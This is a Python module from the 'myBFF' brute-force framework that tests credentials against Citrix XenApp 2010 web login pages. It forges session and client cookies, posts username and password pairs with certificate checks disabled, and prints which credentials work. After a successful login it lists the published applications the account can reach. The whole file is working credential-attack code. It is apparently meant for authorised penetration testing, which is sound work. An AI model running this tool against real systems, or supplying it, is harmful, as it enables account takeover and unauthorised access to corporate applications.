#! /usr/bin/python
# Created by Kirk Hayes (l0gan) @kirkphayes
# Part of myBFF
from core.webModule import webModule
from requests import session
import requests
import re
from argparse import ArgumentParser
import random


class citrix2010Brute(webModule):
    def __init__(self, config, display, lock):
        super(citrix2010Brute, self).__init__(config, display, lock)
        self.fingerprint="20[1,0][4,8,0,9] Citrix"
        self.response="Success"
        self.protocol="web"
    ignore = ['Settings','Log Off', 'Messages']
    def somethingCool(self, config, c, cookies2, cpost, proxy):
       resp3 = c.get(config["HOST"] + '/Citrix/XenApp/site/default.aspx?CTX_MessageType=INFORMATION&CTX_MessageKey=WorkspaceControlReconnectPartialTemp', cookies=cookies2, allow_redirects=False, verify=False, proxies=proxy)
       m = re.search('There are no resources currently available for this user.', resp3.text)
       if m:
           print("[-]      No resources available for user.")
       else:
           o = re.findall('<span>(.*?)</span>', resp3.text, re.DOTALL)
           print("[+]      The following apps/tabs are accessible to " + config["USERNAME"] + ":")
           for n in o:
               if n not in self.ignore:
                   print('[+]                 ' + n)
    def connectTest(self, config, payload, proxy, submitLoc, submitType):
        with session() as c:
            requests.packages.urllib3.disable_warnings()
            silentDetect = c.get(config["HOST"] + '/Citrix/XenApp/auth/silentDetection.aspx', allow_redirects=True, verify=False, proxies=proxy)
            #print silentDetect.text
            try:
                cookie2 = silentDetect.cookies['ASP.NET_SessionId']
            except (KeyError):
                print("[-]  An error occurred. Manually check what apps are available.")
            else:
                cookies2 = dict()
                cookies2['ASP.NET_SessionId'] = cookie2
                cookies2['WIClientInfo'] = "Cookies_On#true~icaScreenResolution#1440x900~clientConnSecure#true"
                cookies2['WINGSession'] = "icaScreenResolution#1440x900~streamingClientDetected#~clientConnSecure#true~remoteClientDetected#Ica-Local%3dAuto~icoStatus#IsNotPassthrough"
                cookies2['WIUser'] = "CTX_ForcedClient#Off~CTX_LaunchMethod#Ica-Local"
                cget = c.get(config["HOST"] + '/Citrix/XenApp/auth/login.aspx', allow_redirects=False, verify=False, proxies=proxy)
                cpost = c.post(config["HOST"] + '/Citrix/XenApp/auth/login.aspx', cookies=cookies2, data=payload, allow_redirects=False, verify=False, proxies=proxy)
            #print cpost.text
                m = re.search('default.aspx', cpost.text)
                if m:
                    print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
                    if not config["dry_run"]:
                        print("[!] Time to do something cool!")
                        self.somethingCool(config, c, cookies2, cpost, proxy)
                else:
                    print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
